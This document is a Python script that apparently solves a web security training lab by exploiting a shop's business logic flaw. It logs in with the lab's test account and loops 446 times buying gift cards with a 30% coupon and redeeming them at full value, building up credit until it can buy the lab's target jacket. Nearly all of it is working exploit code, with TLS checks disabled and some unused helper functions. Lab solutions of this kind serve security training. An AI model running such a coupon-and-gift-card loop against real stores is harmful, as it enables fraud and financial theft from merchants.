import re
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_gift_code(html: str):
    soup = BeautifulSoup(html, "html.parser")
    table = soup.find("table", class_="is-table-numbers")
    if not table:
        return ""
    code = ""
    for td in table.find_all("td"):
        code = td.get_text(strip=True)
    return code

def get_needed_amount(account_credit: float) ->int:
    needed = int(account_credit / 10)
    t = needed * 10
    expected_price = t - t * 0.3
    y = account_credit - expected_price
    z = int(y / 10)
    if z > 0:
        needed = needed + z
    return needed

def buy_item(session: requests.Session, url: str):
    # 1) Login
    print("(+) Trying to login...")
    login(session, f"{url}/login", username="wiener", password="peter")
    print("(+) Logged-in successfully.")

    # 2) Add gift card item and coupon SIGNUP30
    for i in range(446):
        response = session.post(f"{url}/cart", data={
            "productId": "2",
            "redir": "PRODUCT",
            "quantity": "1"
        },verify=False)
        response.raise_for_status()
        
        # 1.1) Applay the coupon -30%
        response = session.post(f"{url}/cart/coupon", data={
            "csrf": get_csrf_token(session, f"{url}/cart"),
            "coupon": "SIGNUP30"
        }, verify=False)
        response.raise_for_status()
        
        # 1.2) Checkout
        response = session.post(f"{url}/cart/checkout", data={
            "csrf": get_csrf_token(session, f"{url}/cart")
        }, verify=False)
        response.raise_for_status()

        # 1.3) Extcract codes
        gift_code = re.findall('<tr>\n(.*?)<td>(.*?)<\/td>', response.text)[0][1]
        if not gift_code:
            raise RuntimeError("(-) Couldn't extract the code!")
        response = session.post(f"{url}/gift-card", data={
            "csrf": get_csrf_token(session, f"{url}/my-account"),
            "gift-card": gift_code
        }, verify=False)
        response.raise_for_status()

    # 3) Add "Lightweight l33t leather jacket"
    print("(+) trying to add \"Lightweight l33t leather jacket\" to cart...")
    data = {"productId": "1",
            "redir": "PRODUCT",
            "quantity": "1"}
    response = session.post(f"{url}/cart", data=data, verify=False)
    if response.status_code != 200:
        raise RuntimeError("(-) Couldn't add \"Lightweight l33t leather jacket\" to cart!")
    print("(+) Item successfuly added.")
    response = session.post(f"{url}/cart/checkout", data={
            "csrf": get_csrf_token(session, f"{url}/cart")
        }, verify=False)
    response.raise_for_status()
    
    # 4) confirm lab solve status
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability!")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1].rstrip("/"))

main()
